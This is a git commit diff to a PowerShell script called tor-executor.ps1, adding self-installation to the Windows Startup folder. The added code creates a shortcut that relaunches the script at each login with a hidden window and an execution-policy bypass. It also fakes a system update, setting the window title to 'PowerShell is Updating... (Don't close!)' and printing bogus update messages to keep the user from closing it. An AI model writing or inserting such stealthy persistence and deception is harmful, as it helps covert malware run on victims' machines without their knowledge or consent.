8f54719a68b7413bb1145ff425f27a32a00f4b47
manuelwestermeier <westermeier111@gmail.com>
2025-12-21 21:17:32 +0100

    Add self-install shortcut to Startup for tor-executor.ps1

--- tor-executor.ps1
+++ tor-executor.ps1
@@ -1,3 +1,29 @@
+# hide +shortcut
+$Host.UI.RawUI.WindowTitle = "PowerShell is Updating... (Don't close!)"
+
+# -----------------------
+# Self‑install to Startup (hidden)
+# -----------------------
+
+$ScriptPath = $MyInvocation.MyCommand.Path
+$StartupFolder = [Environment]::GetFolderPath("Startup")
+$ShortcutPath = Join-Path $StartupFolder ([IO.Path]::GetFileNameWithoutExtension($ScriptPath) + ".lnk")
+
+if (-not (Test-Path $ShortcutPath)) {
+    $WshShell = New-Object -ComObject WScript.Shell
+    $Shortcut = $WshShell.CreateShortcut($ShortcutPath)
+
+    $Shortcut.TargetPath = "powershell.exe"
+    $Shortcut.Arguments = "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$ScriptPath`""
+    $Shortcut.WorkingDirectory = Split-Path $ScriptPath
+    $Shortcut.IconLocation = "$env:SystemRoot\System32\shell32.dll,1"
+
+    $Shortcut.Save()
+}
+
+echo "Important Updates are done..."
+echo "Don't close until finished..."
+
 # -----------------------
 # Configuration
 # -----------------------
